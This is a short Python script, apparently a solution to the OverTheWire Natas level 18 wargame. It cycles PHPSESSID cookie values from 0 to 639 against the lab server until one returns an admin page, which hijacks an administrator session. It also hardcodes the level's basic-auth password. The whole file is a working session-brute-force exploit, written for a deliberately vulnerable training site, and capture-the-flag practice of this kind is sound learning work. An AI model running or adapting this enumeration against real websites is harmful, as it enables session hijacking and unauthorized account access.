#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Mar 10 22:11:14 2021

@author: rohit
"""

import requests

url = "http://natas18.natas.labs.overthewire.org"
session = requests.Session()
leng=0
for i in range(0,640):
    response = requests.get(url,auth=requests.auth.HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),cookies={"PHPSESSID":str(i)})
    print("checking :",i)
    if ("You are an admin." in response.text):
        leng = i
        print("Admin PHPSESID :",leng)
        break
